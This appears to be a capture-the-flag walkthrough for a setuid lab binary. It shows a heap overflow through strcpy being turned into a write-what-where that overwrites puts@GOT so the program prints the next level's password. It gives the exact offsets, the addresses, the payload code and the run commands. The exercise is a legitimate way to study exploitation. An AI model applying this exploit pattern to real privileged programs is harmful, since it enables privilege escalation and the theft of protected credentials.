level7 - walkthrough
====================

Target: /home/user/level7/level7   (setuid + setgid level8)
Goal:   read /home/user/level8/.pass

1. The bug
   main() allocates two structs, each { int id; char *buf; }:
     a = malloc(8); a->buf = malloc(8);
     b = malloc(8); b->buf = malloc(8);
     strcpy(a->buf, argv[1]);   ; <-- unbounded -> heap overflow
     strcpy(b->buf, argv[2]);   ; writes argv[2] to *b->buf
     fopen(".../level8/.pass"); fgets(0x8049960, 0x44, fp);  ; flag -> global
     puts("~~");
   Unused m() @ 0x080484f4 does printf("%s - %d\n", 0x8049960, time(NULL)) --
   it prints the global that fgets just filled with the level8 password.

2. The primitive
   The mallocs are laid out consecutively: a, a->buf, b, b->buf. Overflowing
   a->buf (argv[1]) reaches struct b and overwrites b->buf. The second strcpy
   then writes argv[2] to whatever address we chose -> a write-what-where.

3. Offset and target
   a->buf = 0x0804a018, &b->buf = 0x0804a02c -> 0x14 = 20 bytes.
   Overwrite puts@GOT (0x08049928) with &m (0x080484f4): after fgets loads the
   password, puts("~~") then runs m(), printing the flag.

4. Payload  (Ressources/exploit.py)
     win_addr = p32(0x080484f4)            ; &m, written to "win_addr"
     payload  = b"A"*20 + p32(0x08049928)  ; overflow a->buf -> b->buf = puts@GOT

5. Run
     $ python3 Ressources/exploit.py
     $ ./level7 "$(cat payload)" "$(cat win_addr)"
   argv[2] (&m) is written into puts@GOT, so puts("~~") calls m() and prints the
   level8 password, followed by " - <unix time>".

